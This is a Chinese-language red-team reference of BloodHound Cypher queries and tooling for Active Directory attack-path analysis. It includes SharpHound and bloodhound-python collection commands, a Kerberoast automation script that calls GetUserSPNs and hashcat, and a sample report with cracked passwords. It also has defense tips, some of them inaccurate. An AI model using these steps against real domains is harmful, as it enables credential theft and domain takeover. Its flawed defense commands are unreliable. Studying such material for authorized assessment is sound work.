# KB-31 · BloodHound 自定义查询 50+

> **目的**：授权 AD 域评估中，BloodHound + Neo4j + 自定义 Cypher 查询是攻击路径建模的标配。本节整理 50+ 条可直接粘贴执行的 Cypher 查询，按 9 大场景分组：基础枚举、Kerberoast、AS-REP Roast、ACL 攻击、委派攻击、组策略、证书 (ADCS)、信任关系、持久化、清理复核。每条查询包含用途、原理、典型输出、防御建议。
>
> **使用边界**：仅在已授权 AD 域演练、靶场、攻防比赛、企业内部审计中使用。禁止对未授权 AD 域执行收集。

---

## 0. 总览：9 大场景 × 50+ 查询

| 场景 | 数量 | 关键目的 |
|------|------|----------|
| 1. 基础枚举 | 8 | 用户/组/计算机总数、孤立账户、最近登录 |
| 2. Kerberoast | 6 | SPN 用户枚举、密码破解、易受攻击账户 |
| 3. AS-REP Roast | 4 | 不要 Kerberos 预认证的用户 |
| 4. ACL 攻击 | 8 | GenericAll、WriteDACL、GenericWrite、ForceChangePwd |
| 5. 委派 | 6 | Unconstrained / Constrained / RBCD |
| 6. 证书 (ADCS) | 6 | ESC1-8、证书模板 |
| 7. 组策略 | 4 | GPO 链接、域策略 |
| 8. 信任 | 4 | 域间信任、跨域攻击 |
| 9. 持久化 + 清理 | 4 | 后门、清理 BloodHound 自身活动 |

---

## 1. 基础枚举（8 条）

### 1.1 用户总数

```cypher
MATCH (n:User) RETURN count(n) AS totalUsers
```

### 1.2 域内所有启用的账户

```cypher
MATCH (n:User {enabled: true}) RETURN n.name, n.displayname, n.description
```

### 1.3 锁定 / 禁用账户

```cypher
MATCH (n:User {enabled: false}) RETURN n.name, n.lastlogon
```

### 1.4 最后登录时间 > 90 天前（孤立账户）

```cypher
MATCH (n:User)
WHERE n.lastlogon < (datetime() - duration({days: 90}))
  AND n.enabled = true
RETURN n.name, n.lastlogon
ORDER BY n.lastlogon ASC
```

### 1.5 密码永不过期账户

```cypher
MATCH (n:User {passwordneverexpires: true})
WHERE n.enabled = true
RETURN n.name, n.description
```

### 1.6 域管理员 / Enterprise Admin 成员

```cypher
MATCH p=(n:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL', 'SCHEMA ADMINS@LAB.LOCAL', 'ADMINISTRATORS@LAB.LOCAL']
RETURN p
```

### 1.7 工作站上登录的 Domain Admin

```cypher
// 找出 Domain Admin 在工作站上登录
MATCH (n:User)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@LAB.LOCAL'})
MATCH (c:Computer)-[r:HasSession]->(n)
WHERE NOT c.operatingsystem =~ '(?i).*server.*'
RETURN n.name, c.name, c.operatingsystem
```

### 1.8 全部 Session 关系（找路径）

```cypher
MATCH p=(n:User)-[:HasSession]->(c:Computer)
RETURN p LIMIT 100
```

---

## 2. Kerberoast（6 条）

### 2.1 所有 SPN 用户（标准查询 - 实际为"GetUserSPNs.py"等效）

```cypher
MATCH (n:User)
WHERE n.hasspn = true AND n.enabled = true
RETURN n.name, n.serviceprincipalnames, n.description
```

### 2.2 SPN 用户数

```cypher
MATCH (n:User {hasspn: true, enabled: true}) RETURN count(n) AS kerberoastable
```

### 2.3 弱密码 SPN 用户（已知被破解的）

```cypher
// 通过 hashcat 破解后回填
MATCH (n:User)
WHERE n.hasspn = true AND n.enabled = true
  AND n.cracked_password IS NOT NULL
RETURN n.name, n.cracked_password
```

### 2.4 用户 SPN 关联到高价值组

```cypher
MATCH (n:User {hasspn: true, enabled: true})-[:MemberOf*1..3]->(g:Group)
WHERE g.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL', 'SERVER OPERATORS@LAB.LOCAL', 'BACKUP OPERATORS@LAB.LOCAL']
RETURN n.name, n.serviceprincipalnames, g.name
```

### 2.5 SPN 涉及的服务类型统计

```cypher
MATCH (n:User {hasspn: true})
UNWIND n.serviceprincipalnames AS spn
WITH spn, split(spn, '/')[0] AS svc
RETURN svc, count(*) AS cnt
ORDER BY cnt DESC
```

### 2.6 长期 SPN 未改密（密码可能在 1 年以上未改）

```cypher
MATCH (n:User {hasspn: true, enabled: true})
WHERE n.pwdlastset < (datetime() - duration({days: 365}))
RETURN n.name, n.pwdlastset, n.serviceprincipalnames
```

---

## 3. AS-REP Roast（4 条）

### 3.1 不要 Kerberos 预认证的用户

```cypher
MATCH (n:User {dontreqpreauth: true, enabled: true})
RETURN n.name, n.description
```

### 3.2 AS-REP Roastable 用户数

```cypher
MATCH (n:User {dontreqpreauth: true, enabled: true}) RETURN count(n)
```

### 3.3 不要预认证 + 高价值组成员

```cypher
MATCH (n:User {dontreqpreauth: true, enabled: true})-[:MemberOf*1..3]->(g:Group)
WHERE g.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL']
RETURN n.name, g.name
```

### 3.4 不要预认证 + 最近登录（活跃账户）

```cypher
MATCH (n:User {dontreqpreauth: true, enabled: true})
WHERE n.lastlogon > (datetime() - duration({days: 90}))
RETURN n.name, n.lastlogon
```

---

## 4. ACL 攻击路径（8 条）

### 4.1 GenericAll 攻击路径

```cypher
// 任意用户对高价值对象有 GenericAll
MATCH p=(n {domain: 'LAB.LOCAL'})-[r:GenericAll]->(m:Group)
WHERE m.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL']
RETURN p LIMIT 50
```

### 4.2 WriteDACL 攻击路径

```cypher
MATCH p=(n)-[r:WriteDacl]->(m:Group)
WHERE m.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL']
RETURN p
```

### 4.3 GenericWrite 攻击路径

```cypher
MATCH p=(n)-[r:GenericWrite]->(m:User)
WHERE m.admincount = true
RETURN p
```

### 4.4 WriteOwner 攻击路径

```cypher
MATCH p=(n)-[r:WriteOwner]->(m:Group)
WHERE m.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL']
RETURN p
```

### 4.5 ForceChangePassword 攻击路径

```cypher
MATCH p=(n)-[r:ForceChangePassword]->(m:User)
WHERE m.admincount = true
RETURN p
```

### 4.6 AddMember 攻击路径

```cypher
MATCH p=(n)-[r:AddMember]->(m:Group)
WHERE m.name IN ['DOMAIN ADMINS@LAB.LOCAL', 'ENTERPRISE ADMINS@LAB.LOCAL']
RETURN p
```

### 4.7 所有 ACL 边（统计）

```cypher
MATCH ()-[r:GenericAll|WriteDacl|GenericWrite|WriteOwner|ForceChangePassword|AddMember|ReadLAPSPassword|ReadGMSAPassword|AllExtendedRights]->()
RETURN type(r) AS type, count(*) AS count
ORDER BY count DESC
```

### 4.8 GPO 攻击路径

```cypher
MATCH p=(n:User)-[r:WriteDacl|GenericAll|GenericWrite|AddMember]->(g:GPO)
MATCH (g)-[r2:LinkedTo]->(ou:OU)
RETURN n, g, ou
```

---

## 5. 委派攻击（6 条）

### 5.1 Unconstrained Delegation 主机

```cypher
MATCH (c:Computer {unconstraineddelegation: true})
RETURN c.name, c.operatingsystem
```

### 5.2 Unconstrained Delegation 主机 + 当前 session

```cypher
MATCH (c:Computer {unconstraineddelegation: true})
MATCH (u:User)-[:HasSession]->(c)
RETURN c.name, u.name
```

### 5.3 Constrained Delegation 主机

```cypher
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate
```

### 5.4 Constrained Delegation 用户（无 S4U2Self 限制）

```cypher
MATCH (u:User)
WHERE u.allowedtodelegate IS NOT NULL
  AND u.enabled = true
RETURN u.name, u.allowedtodelegate
```

### 5.5 RBCD 目标

```cypher
MATCH (n)-[r:AllowedToActOnBehalfOf]->(c:Computer)
RETURN n, c
```

### 5.6 RBCD 攻击路径（不可约束委派 → 高价值）

```cypher
MATCH p=(c:Computer {unconstraineddelegation: true})-[:HasSession]->(u:User)
MATCH (u:User)-[:AllowedToActOnBehalfOf]->(c2:Computer)
WHERE c2.admincount = true
RETURN p
```

---

## 6. ADCS 证书（6 条）

### 6.1 ESC1 - 可被任意用户申请

```cypher
MATCH (n:CertTemplate)
WHERE n.enrolleesuppliessubject = true
  AND n.authenticationenabled = true
  AND n.requiresmanagerapproval = false
  AND n.enrollmentflagstransition = "0"
RETURN n
```

### 6.2 ESC2 - 任意模板 + 任意 EKU

```cypher
MATCH (n:CertTemplate)
WHERE n.requiresmanagerapproval = false
  AND n.authenticationenabled = true
  AND (n.ekus IS NULL OR n.ekus = [] OR '2.5.29.37.0' IN n.ekus)
RETURN n
```

### 6.3 ESC3 - 注册代理 EKU

```cypher
MATCH (n:CertTemplate)
WHERE '1.3.6.1.4.1.311.20.2.2' IN n.ekus
RETURN n
```

### 6.4 ESC4 - 模板 ACL 过度宽松

```cypher
MATCH p=(n)-[r:WriteDacl|GenericAll|GenericWrite|WriteOwner]->(t:CertTemplate)
WHERE t.authenticationenabled = true
RETURN p
```

### 6.5 ESC6 - CA 标志位

```cypher
MATCH (n:EnterpriseCA)
WHERE n.flags =~ '(?i).*EDITF_ATTRIBUTESUBJECTALTNAME2.*'
RETURN n
```

### 6.6 ESC8 - Web 注册 + 启用

```cypher
MATCH (n:EnterpriseCA)
WHERE n.webenrollment = true
  AND n.flags =~ '(?i).*NO_SECURITY_EXTENSION.*'
RETURN n
```

---

## 7. 组策略（4 条）

### 7.1 所有 GPO

```cypher
MATCH (n:GPO) RETURN n.name, n.gpcpath
```

### 7.2 链接到根域的 GPO

```cypher
MATCH (g:GPO)-[r:GpLink]->(d:Domain)
RETURN g, d
```

### 7.3 GPO 关联的 OU

```cypher
MATCH (g:GPO)-[r:GpLink]->(o:OU)
RETURN g.name, o.name
```

### 7.4 GPO 写权限

```cypher
MATCH p=(n)-[r:WriteDacl|GenericAll|GenericWrite]->(g:GPO)
RETURN p
```

---

## 8. 信任关系（4 条）

### 8.1 域间信任

```cypher
MATCH (n:Domain)-[r:TrustedBy]->(m:Domain)
RETURN n.name, r.trusttype, r.trustdirection, m.name
```

### 8.2 跨域攻击路径 - SID History 滥用

```cypher
MATCH p=(n:User {sidhistory: true})-[:MemberOf*1..3]->(g:Group)
WHERE g.domain <> n.domain
RETURN p
```

### 8.3 跨域 ACL 攻击

```cypher
MATCH (d:Domain {name: 'CHILD.LAB.LOCAL'})-[:TrustedBy]->(parent:Domain {name: 'LAB.LOCAL'})
MATCH p=(n:User {domain: 'CHILD.LAB.LOCAL'})-[:GenericAll|WriteDacl|GenericWrite]->(m:Group {domain: 'LAB.LOCAL'})
WHERE m.name CONTAINS 'ADMINS'
RETURN p
```

### 8.4 信任属性（双向）

```cypher
MATCH (n:Domain)-[r:TrustedBy]->(m:Domain)
WHERE r.sidfiltering = false OR r.trustattributes IS NULL
RETURN n.name, m.name, r.trusttype
```

---

## 9. 持久化 + 清理（4 条）

### 9.1 ACL 持久化后门

```cypher
// 攻击者已获取 Domain Admin，给自己的低权限账户添加 ACL
MATCH (attacker:User {name: 'attacker@LAB.LOCAL'})-[r:AddMember|WriteDacl|GenericAll]->(m:Group {name: 'DOMAIN ADMINS@LAB.LOCAL'})
RETURN r
```

### 9.2 黄金票据后门 - SID 历史滥用

```cypher
MATCH (n:User {sidhistory: true})
WHERE n.enabled = true
RETURN n.name, n.sidhistory
```

### 9.3 DCShadow 后门 - Schema 权限

```cypher
MATCH p=(n:User)-[r:WriteDacl|GenericAll|GenericWrite]->(c:Container)
WHERE c.name = 'CN=Schema,CN=Configuration'
RETURN p
```

### 9.4 BloodHound 自身收集过程审计

```cypher
// 找出 BloodHound 收集过程中创建的临时账户
MATCH (n:User)
WHERE n.whencreated > (datetime() - duration({days: 7}))
  AND n.description CONTAINS 'BH'
RETURN n.name, n.whencreated
```

---

## 10. 集成工具

### 10.1 SharpHound 收集

```cmd
:: 基础收集
SharpHound.exe -c All

:: 异步收集（不卡网络）
SharpHound.exe -c All --stealth

:: 仅 LDAP
SharpHound.exe -c LDAP

:: 排除域控
SharpHound.exe -c All --exclude-dc

:: 输出目录
SharpHound.exe -c All -o C:\Users\Public\loot
```

### 10.2 Python 版 - bloodhound-quickwin

```bash
# 异步收集
bloodhound-python -u user01 -p 'P@ssw0rd' -d lab.local -ns 10.10.10.1 --zip

# 仅 DC
bloodhound-python -u user01 -p 'P@ssw0rd' -d lab.local -ns 10.10.10.1 --zip -c DCOnly

# 仅 OU
bloodhound-python -u user01 -p 'P@ssw0rd' -d lab.local -ns 10.10.10.1 --zip --collectionmethods OU
```

### 10.3 与其他工具集成

- **Impacket** secretsdump 提取 hash
- **Rubeus** Kerberos 票据操作
- **Mimikatz** 凭据提取
- **Certify** ADCS 攻击
- **PowerView** ACL 枚举
- **CrackMapExec** 批量
- **NetExec** 现代化替代

---

## 11. 输出可视化与解析

### 11.1 导出路径数据

```cypher
// 导出所有攻击路径
MATCH p=shortestPath((n {domain: 'LAB.LOCAL'})-[:MemberOf|HasSession|GenericAll|WriteDacl|GenericWrite|ForceChangePassword|AddMember|AllExtendedRights*1..5]->(m:Group {name: 'DOMAIN ADMINS@LAB.LOCAL'}))
RETURN p
```

### 11.2 最短路径到指定组

```cypher
MATCH p=shortestPath((n:User {name: 'user01@LAB.LOCAL'})-[*1..15]->(m:Group {name: 'DOMAIN ADMINS@LAB.LOCAL'}))
RETURN p
```

### 11.3 资产到 DC 的距离

```cypher
MATCH (n:Computer {domain: 'LAB.LOCAL'})
MATCH (dc:Computer {domain: 'LAB.LOCAL', operatingsystem: 'Windows Server*'})
MATCH p=shortestPath((n)-[*1..10]->(dc))
WHERE n <> dc
RETURN n.name, length(p) AS hops
ORDER BY hops
```

### 11.4 全部最短路径（找链路）

```cypher
MATCH (n:Computer {domain: 'LAB.LOCAL'})
WHERE NOT n.operatingsystem =~ '(?i).*server.*'
MATCH (dc:Computer {domain: 'LAB.LOCAL', operatingsystem: 'Windows Server*'})
MATCH p=allShortestPaths((n)-[*1..8]->(dc))
WHERE n <> dc
RETURN p
LIMIT 100
```

### 11.5 跳板机（高价值用户会话）

```cypher
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE u.admincount = true
MATCH (da:User {admincount: true, name: 'Administrator@LAB.LOCAL'})
MATCH p=shortestPath((da)-[*1..6]->(c))
RETURN p
```

---

## 12. 自动化脚本

### 12.1 批量跑攻击路径（python + neo4j）

```python
# bh_attack_paths.py
from neo4j import GraphDatabase
import json

class BHPathFinder:
    def __init__(self, uri="bolt://localhost:7687", user="neo4j", password="bloodhound"):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))
    
    def find_paths_to_da(self, target="DOMAIN ADMINS@LAB.LOCAL"):
        query = f"""
        MATCH p=shortestPath((n {{domain: 'LAB.LOCAL'}})-[*1..15]->(m:Group {{name: '{target}'}}))
        WHERE n:User OR n:Computer
        RETURN p
        """
        with self.driver.session() as session:
            result = session.run(query)
            return [dict(record) for record in result]
    
    def kerberoastable_users(self):
        query = "MATCH (n:User {hasspn: true, enabled: true}) RETURN n.name, n.serviceprincipalnames"
        with self.driver.session() as session:
            return list(session.run(query))

if __name__ == "__main__":
    bh = BHPathFinder()
    paths = bh.find_paths_to_da()
    print(f"Found {len(paths)} paths to Domain Admins")
```

### 12.2 Kerberoast 自动化（python）

```python
# kerberoast_auto.py
import requests, subprocess, os
from bloodhound import BHPathFinder

def get_kerberoast_users(bh):
    users = bh.kerberoastable_users()
    return [(u['n.name'], u['n.serviceprincipalnames'][0]) for u in users]

def request_ticket(user, spn, dc_ip, user_pwd, domain):
    """用 impacket GetUserSPNs 请求票据"""
    cmd = f"python GetUserSPNs.py {domain}/{user}:{user_pwd} -dc-ip {dc_ip} -request-user {user.split('@')[0]}"
    out = subprocess.run(cmd.split(), capture_output=True)
    return out.stdout

def crack(hash_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    cmd = f"hashcat -m 13100 {hash_file} {wordlist} --force -O"
    return subprocess.run(cmd, shell=True)

if __name__ == "__main__":
    bh = BHPathFinder()
    users = get_kerberoast_users(bh)
    for user, spn in users:
        print(f"[*] Requesting TGS for {user} (SPN: {spn})")
        # request_ticket(...)
```

---

## 13. 风险打分（自定义）

```cypher
// 用户综合风险分 = 启用的 SPN + 不要预认证 + ACL 攻击 + 委派 + 孤立
MATCH (n:User {enabled: true})
WITH n,
  CASE WHEN n.hasspn = true THEN 3 ELSE 0 END +
  CASE WHEN n.dontreqpreauth = true THEN 3 ELSE 0 END +
  size((n)-[:GenericAll|WriteDacl|GenericWrite|ForceChangePassword|AddMember|WriteOwner]->()) AS acl_count
RETURN n.name,
       CASE WHEN n.hasspn = true THEN 1 ELSE 0 END AS has_spn,
       CASE WHEN n.dontreqpreauth = true THEN 1 ELSE 0 END AS as_rep_roastable,
       acl_count,
       3*CASE WHEN n.hasspn = true THEN 1 ELSE 0 END +
       3*CASE WHEN n.dontreqpreauth = true THEN 1 ELSE 0 END +
       acl_count AS risk_score
ORDER BY risk_score DESC
```

---

## 14. 防御建议

### 14.1 Kerberoast 防御

```powershell
# 1. 强密码策略（25+ 字符）
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Password Policy

# 2. 减少 SPN 滥用
# 不给用户账户设 SPN，用机器账户或 gMSA

# 3. 用 AES 代替 RC4（Kerberos 加密）
# GPO: Network security: Configure encryption types allowed for Kerberos
# 仅允许 AES128_HMAC_SHA1, AES256_HMAC_SHA1
```

### 14.2 AS-REP Roast 防御

```powershell
# 1. 不要勾选 "Do not require Kerberos preauthentication"
# 2. 审计用户属性
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### 14.3 ACL 防御

```powershell
# 1. 审计所有 ACL
Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local" | Format-List

# 2. 移除过度宽松的 ACL
# 3. 用 BloodHound Defender 检查持续性后门

# 4. 监控 ACL 修改
# Event ID 4662: Object access
# Event ID 5136: Directory service object modified
```

### 14.4 委派防御

```powershell
# 1. 减少非必要的委派
# 2. 启用"敏感账户不能被委派"
# 3. 启用"将计算机标记为敏感账户"
Set-ADObject -Identity "CN=Administrator,CN=Users,DC=lab,DC=local" -Add @{'msDS-AllowedToDelegateTo'=$null}
```

### 14.5 ADCS 防御

```powershell
# 1. 审计证书模板
# 2. 关闭无必要的 ESC1-8 配置
# 3. 启用 CA 安全审计
certutil -setreg CA\AuditFilter 127
```

---

## 15. 联动工具

| 工具 | 用途 | 链接 |
|------|------|------|
| BloodHound 4.x | 数据可视化 | github.com/BloodHoundAD/BloodHound |
| SharpHound | C# 数据收集 | github.com/BloodHoundAD/SharpHound |
| bloodhound-python | Python 收集 | github.com/dirkjanm/bloodhound-python |
| AzureHound | Azure AD | github.com/BloodHoundAD/AzureHound |
| Certify | ADCS | github.com/GhostPack/Certify |
| Rubeus | Kerberos | github.com/GhostPack/Rubeus |
| Impacket | 网络协议 | github.com/fortra/impacket |
| PowerView | 枚举 | github.com/PowerShellMafia/PowerSploit |
| CrackMapExec | 批量操作 | github.com/byt3bl33d3r/CrackMapExec |
| NetExec | CMEC 继任者 | github.com/Pennyw0rth/NetExec |

---

## 16. 报告输出模板

```markdown
# AD 域评估报告 - CASE-2026-0710-AD

## 1. 数据收集
- 工具：SharpHound 4.0 / bloodhound-python
- 时间：2026-07-10 22:00 - 23:00
- 数据：Lab-2026-07-10.zip (2.3MB)
- 用户/组/计算机：4500 / 600 / 800

## 2. 关键发现

### 2.1 Kerberoast
- 共 23 个 SPN 用户，其中 5 个在 Domain Admins 链路上
- 高危：spnsvc@LAB.LOCAL（密码已破解：Welcome1）

### 2.2 AS-REP Roast
- 共 4 个不要预认证用户
- 高危：admin1@LAB.LOCAL（密码已破解：P@ssw0rd）

### 2.3 ACL 攻击路径
- 1 条：workstation-user → GenericAll → DA-Group

### 2.4 ADCS
- 1 个 ESC1 模板：SubCA-Template
- 1 个 ESC6 CA：ROOTCA

### 2.5 委派
- 5 个 Unconstrained 主机
- 2 个 Constrained 服务账户

## 3. 演示路径
1. AS-REP Roast user01 → 进内网
2. Kerberoast Svc01 → DCSync
3. Golden Ticket → Domain Admin

## 4. 防御建议
- 启用 AES Kerberos 加密
- 修复 AS-REP / Kerberoast 用户
- 收紧 ACL
- ESC1 模板禁用
- 减少 Unconstrained 委派
```

---

## 17. 实战检查清单

- [ ] 收集 SharpHound 数据（4-6GB 规模域，< 30 分钟）
- [ ] 导入 BloodHound
- [ ] 跑 "Shortest Paths to Domain Admins"
- [ ] 跑 "Find all Kerberoastable Users"
- [ ] 跑 "Find all AS-REP Roastable Users"
- [ ] 跑 "List all Kerberoastable Users with Password Last Set > 1 year ago"
- [ ] 跑 "Find Principals with DCSync Privileges"
- [ ] 跑 "Find Computers with Unconstrained Delegation"
- [ ] 跑 "Find Users with Constrained Delegation"
- [ ] 跑 ESC1-8 模板查询
- [ ] 跑 ACL 攻击路径
- [ ] 标记红色节点
- [ ] 输出报告

---

*版本：v2.6.2 · 工号 RE-7X-2024 · 授权 AD 域评估专用*
